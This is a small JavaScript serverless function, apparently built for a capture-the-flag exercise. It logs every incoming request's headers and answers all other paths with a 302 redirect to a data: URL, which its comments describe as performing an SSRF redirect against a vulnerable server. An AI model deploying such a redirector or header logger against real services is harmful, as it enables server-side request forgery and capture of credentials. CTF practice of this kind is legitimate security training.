// This module exports a single function that Vercel will use as a serverless endpoint.
module.exports = (req, res) => {
  // We'll keep a simple in-memory log of all requests to this endpoint.
  // This will reset with each cold start of the Vercel function.
  // For a CTF, this is perfect for seeing if the exploit worked recently.
  const requestDetails = {
    timestamp: new Date().toISOString(),
    method: req.method,
    url: req.url,
    headers: req.headers
  };

  // Log the details to the console so you can see them in Vercel's logs.
  console.log('Received request:', JSON.stringify(requestDetails, null, 2));

  // The core logic of the redirector.
  // We check if the request is for our special '/log' endpoint.
  if (req.url === '/log') {
    // If it's the log request, we'll respond with a simple message.
    // In a real-world scenario, you might store logs in a database, but for a CTF,
    // this will let you know the function is alive and responding.
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      status: "Log endpoint is working.",
      message: "Check Vercel's logs to see all incoming requests."
    }, null, 2));
  } else {
    // This is the part that performs the SSRF redirect.
    // The browser might block this, but the vulnerable CTF server will not.
    res.writeHead(302, {
      'Location': 'data:text/html;base64,PGh0bWw+PGhlYWQ+PHRpdGxlPlN1Y2Nlc3M8L3RpdGxlPjwvZ2hlYWQ+Ym9keT48aDE+Q1RGIEZsYWcgR2VuZXJhdGVkPC9oMT48L2JvZHk+PC9odG1sPg=='
    });
    res.end();
  }
};
